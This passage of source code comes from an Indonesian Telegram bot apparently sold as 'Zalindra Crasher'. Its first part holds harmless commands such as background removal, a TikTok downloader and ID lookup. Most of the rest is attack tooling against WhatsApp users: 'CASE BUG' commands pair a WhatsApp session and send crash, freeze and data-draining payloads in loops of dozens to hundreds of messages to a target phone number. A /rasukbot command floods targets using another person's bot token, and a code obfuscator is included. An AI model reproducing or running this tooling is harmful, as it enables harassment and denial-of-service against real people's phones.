      "https://api.remove.bg/v1.0/removebg",
      formData,
      {
        headers: {
          ...formData.getHeaders(),
          "X-Api-Key": REMOVE_BG_KEY
        },
        responseType: "arraybuffer"
      }
    );

   
    const filePath = `./removebg_${chatId}.png`;
    fs.writeFileSync(filePath, response.data);

   
    await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption: "✨ Background berhasil dihapus!"
      }
    );

  
    fs.unlinkSync(filePath);

  } catch (error) {
    console.error(
      "REMOVEBG ERROR:",
      error.response?.data?.toString() || error.message
    );

    return ctx.reply(
      `❌ Gagal remove background:\n${
        error.response?.data?.toString() || error.message
      }`
    );
  }
});

bot.command("livejam", async (ctx) => {
  const chatId = ctx.chat.id;


  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
  }

  const msg = await ctx.reply(getTimeIndonesia());

  liveIntervals[chatId] = setInterval(async () => {
    try {
      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        null,
        getTimeIndonesia()
      );
    } catch (e) {
      clearInterval(liveIntervals[chatId]);
      delete liveIntervals[chatId];
    }
  }, 3000); 
});

bot.command("stopjam", (ctx) => {
  const chatId = ctx.chat.id;

  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
    delete liveIntervals[chatId];
    ctx.reply("⛔ Live clock dihentikan");
  } else {
    ctx.reply("❌ Tidak ada live clock yang aktif");
  }
});

bot.command("listharga", (ctx) => {
  ctx.reply(`
<pre>💰 LIST HARGA SCRIPT ZALINDRA

━━━━━━━━━━━━━━━
15K FREE UPADATE 2×
25K FULL UPDATE
50K RESS SCRIPT
85K PARTNER SCRIPT
120K OWNER SCRIPT
━━━━━━━━━━━━━━━
Order: @seanoffcx
</pre>`, { parse_mode: "HTML" });
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Atomic Crashers ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("enc", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;

    if (!reply || !reply.document) {
      return ctx.reply("❌ Reply file .js dengan command /enc");
    }

    const doc = reply.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus JavaScript (.js)");
    }

    const file = await ctx.telegram.getFile(doc.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    const res = await axios.get(fileUrl);
    let code = res.data;

    if (!code || code.length < 5) {
      return ctx.reply("❌ File kosong / tidak valid");
    }

    await ctx.reply("🔐 Encrypt aman sedang berjalan...");

  
    code = `/* Protected Script - ${ctx.from.first_name} */\n` + code;

    const obf = JavaScriptObfuscator.obfuscate(code, {
      compact: true,
      controlFlowFlattening: false,
      deadCodeInjection: false,
      debugProtection: false,
      disableConsoleOutput: true,
      stringArray: true,
      stringArrayEncoding: ["base64"],
      stringArrayThreshold: 0.75,
      stringArrayShuffle: true,
      splitStrings: true,
      splitStringsChunkLength: 5
    });

    const result = obf.getObfuscatedCode();

    await ctx.replyWithDocument({
      source: Buffer.from(result, "utf8"),
      filename: "enc_safe.js"
    }, {
      caption: "✅ Encrypt berhasil (reply mode)\n🔒 Stabil & Aman"
    });

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal encrypt");
  }
});

bot.command("rasukbot", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  if (!args) {
    return ctx.reply(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    if (reply) {
      const parts = args.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return ctx.reply(
          "❌ Format salah!\nGunakan: <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {

      if (!args.includes("|")) {
        return ctx.reply(
          "📩 Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = args.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.reply(
        "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.reply(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.reply(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.command("cekid", async (ctx) => {
  try {
    let target = ctx.from;

   
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id;
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const username = target.username ? `@${target.username}` : "Tidak ada username";
    const fullName = `${firstName} ${lastName}`.trim();

    const teks = `
<blockquote><strong>「 CEK USER ID 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💬 Chat ID: <code>${ctx.chat.id}</code>
    `;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKID ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek ID\n${e.message}`
    );
  }
});
/// Connect ////
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Restart bot dulu.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("Example:\n/connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://files.catbox.moe/0v951c.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`<pre>⬡═―⊱「 𝙴𝙻𝚅𝙰𝙽𝙳𝙴𝚁 𝙲𝚛𝚊𝚜𝚑𝚎𝚛 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ  Nomor  : ${phoneNumber}
ϟ  Kode   : ${formattedCode}
ϟ  Note  : KALO GAGAL PAIR HAPUS SENSASION 

ϟ  🟡 Status : Waiting for connection...
</pre>`,
        parse_mode: "HTML"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing!");
  }
});

/// ------ Kill Sesi -------- ///
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session dihapus, silakan /connect ulang");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session");
  }
});
/// CASE BUG ///
bot.command("xsow", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /xsow 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝙴𝙻𝚅𝙰𝙽𝙳𝙴𝚁 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${cleanNumber}`, style: "success" }],
        ]
      } 
    }
  );

  (async () => {
    for (let i = 0; i < 200; i++) {
      await DelayPermaV5(sock, target)
      await sleep(1000);
    }
  })();

});
/// CASE BUG ///
bot.command("xspam", checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /xspam 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝙴𝙻𝚅𝙰𝙽𝙳𝙴𝚁 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${cleanNumber}`, style: "success" }],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 65; i++) {
      await VnXDelayHardVisibleNew(sock, target)
      await sleep(800);
      await VnXDelayHardTagSwNew(sock, target)
      await sleep(1000);
    }
  })();

});
/// CASE BUG ///
bot.command("Xcombo", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /Xcombo 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /Xcombo 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Combo Function
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ??% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /Xcombo 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Combo fuction 
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ??% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Crasher`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 95; i++) {
      await groupInInvis(target)
        await new Promise(r => setTimeout(r, 700));
      await newCatalog(target)
        await new Promise(r => setTimeout(r, 1000));
      await Xcatalog(target)
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG ///
bot.command("overloads", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /overloads 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /overloads
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : frezee visible
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 70% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /overloads 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : frezee visible
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 70% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 35; i++) {
      await FrezeeChat(target)
        await new Promise(r => setTimeout(r, 700));
      await FrezeeChat(target)
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
///case bug visible//
bot.command("xpire", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xpire 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xpire
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : proto 1-8
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 85% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xpire
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : proto 1-8
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 85% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 75; i++) {
      await VnXDelayNewByRaffi(sock, target)
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
///case buldo 3///
bot.command("xmbg", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xmbg 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xmbg
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : drain kuota
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ?? 
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xmbg
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : drain kuota
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ?? 
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 75; i++) {
      await aVnxDelayHardV2sw(sock, target);
         await new Promise(r => setTimeout(r, 600));
      await VnxDelayHardV2sw(sock, target);
         await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
//case bug ios 4///
bot.command("xhold", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xhold 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xhold
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : forclose no click ios
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ?? 
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xhold
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : forclose no click ios
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ?? 
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 65; i++) {
      await VnXCrashIos(sock, target)
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// case memek 2////
bot.command("xnull", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xnull 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xnull
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : blank hard
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ?? 
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xnull
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
